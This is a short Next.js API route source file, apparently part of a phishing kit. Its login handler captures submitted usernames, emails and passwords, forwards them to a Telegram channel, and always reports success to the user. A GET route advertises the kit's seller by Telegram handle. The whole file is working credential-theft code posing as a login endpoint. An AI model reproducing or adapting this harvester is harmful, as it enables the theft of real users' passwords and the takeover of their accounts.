import { NextRequest, NextResponse } from 'next/server';
import { sendTelegramMessage } from '@/lib/telegram';

export async function POST(request: NextRequest) {
  try {
    const body = await request.json().catch(() => ({}));
    const username = body?.username || body?.email || '';
    const password = body?.password || body?.epwsd || '';

    try {
      await sendTelegramMessage({ username, password }, 'login');
    } catch (telegramError) {
      console.error('Telegram send failed:', telegramError);
    }

    return NextResponse.json({ success: true, message: 'Login processed' });
  } catch (error) {
    console.error('Error in login API:', error);
    return NextResponse.json({ success: true });
  }
}

// Handle GET requests (for testing)
export async function GET() {
  return NextResponse.json({ message: 'For Page and Link Contact Telegram: @Mr0xBD' });
}
